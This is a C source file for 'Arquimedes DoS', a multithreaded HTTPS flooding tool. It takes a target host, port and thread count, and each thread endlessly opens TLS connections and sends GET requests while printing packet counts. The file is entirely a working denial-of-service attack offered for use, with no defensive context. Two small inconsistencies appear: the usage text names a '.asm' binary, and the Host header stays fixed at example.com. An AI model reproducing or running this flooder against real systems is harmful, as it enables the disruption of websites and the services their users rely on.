#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>

char *target_host = "example.com";
int target_port = 443;
int threads = 50;

void* flood(void* arg) {
    SSL_library_init();
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    int packet_count = 0;

    while (1) {
        struct hostent *host = gethostbyname(target_host);
        struct sockaddr_in addr;
        int sock;

        sock = socket(AF_INET, SOCK_STREAM, 0);
        addr.sin_family = AF_INET;
        addr.sin_port = htons(target_port);
        addr.sin_addr = *((struct in_addr*) host->h_addr);

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
            close(sock);
            continue;
        }

        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        if (SSL_connect(ssl) != -1) {
            char req[] = "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: keep-alive\r\n\r\n";
            SSL_write(ssl, req, strlen(req));
            packet_count++;
            printf("Arquimedes DoS --> %d packet sent to %s!\n", packet_count, target_host);
        }

        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(sock);
    }

    SSL_CTX_free(ctx);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 7) {
        printf("Usage: ./arquimedes.asm -I <host> -p <port> -t <threads>\n");
        return 1;
    }

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-I") == 0) {
            target_host = argv[i + 1];
        }
        if (strcmp(argv[i], "-p") == 0) {
            target_port = atoi(argv[i + 1]);
        }
        if (strcmp(argv[i], "-t") == 0) {
            threads = atoi(argv[i + 1]);
        }
    }

    printf("𖤛 Arquimedes DoS started by Jhon Landembeguer 𖤛\n");

    pthread_t tid[threads];
    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, flood, NULL);
        usleep(10000);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    return 0;
}
